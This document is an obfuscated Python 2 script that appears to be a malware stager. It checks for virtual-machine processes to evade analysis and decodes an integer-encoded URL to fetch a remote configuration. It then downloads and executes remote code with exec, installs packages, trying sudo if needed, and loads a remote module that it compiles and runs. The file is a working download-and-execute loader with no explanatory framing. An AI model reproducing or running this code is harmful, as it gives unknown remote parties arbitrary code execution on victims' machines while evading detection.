#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from struct import calcsize
from imp import new_module
from json import loads
from urllib import urlopen


def run(*args, **kwargs):
    SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
    AccidentalAquaticCactus = loads(urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
    AccidentalAquaticCactus['settings']['f'] = str(globals().get('__file__'))
    ReflectiveTightfistedTrapezoid = AccidentalAquaticCactus['settings'].get('v')
    try:
        GroovySophisticatedLemur = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
        if not len(GroovySophisticatedLemur):
            exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('y'))).read() in globals()
            exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('x'))).read() in globals()
        BloatedLionProlapse = lambda x: os.popen(' '.join(['{}'.format(i) for i in x])).read().rstrip()
        for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(calcsize('P') * 8)].items():
            GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse([GroovySophisticatedLemur, 'install', NobleRusticWalrus])    
            if not len(BloatedLionProlapse([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                with file(os.path.basename(NobleRusticWalrus), 'wb') as fp:
                    fp.write(urlopen(NobleRusticWalrus, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.17025', 'Referer':'https://www.lfd.uci.edu/~gohlke/pythonlibs/'}).read())
                GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', os.path.basename(NobleRusticWalrus)])
            ChivalrousIntergalacticPlayboy = os.remove(os.path.basename(NobleRusticWalrus)) if os.path.isfile(os.path.basename(NobleRusticWalrus)) else None
    finally:
        imports = urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('w'))).read()
        uri     = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('u'))
        name    = os.path.splitext(os.path.basename(uri))[0]
        module  = new_module(name)
        source  = '\n\n'.join([imports, urlopen(uri).read()])
        code    = compile(source, name, 'exec')
        exec code in module.__dict__
        return module.main(**AccidentalAquaticCactus['settings'])

def main(*args, **kwargs):
    s = 'tasklist' if os.name is 'nt' else 'ps'
    c = 0 if os.name is 'nt' else -1
    if 'checkvm' in kwargs:
        if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in (kwargs.get('procs') or ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'])]) if (bool(kwargs.get('checkvm')) if 'checkvm' in kwargs else False) else bool([]):
            print 'aborting...'
#           return abort()
    if 'config' in kwargs:
        return run(**kwargs)
    else:
        print "missing argument 'config'"
#       return abort()
    

if __name__ == '__main__':
    main(config=5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950)
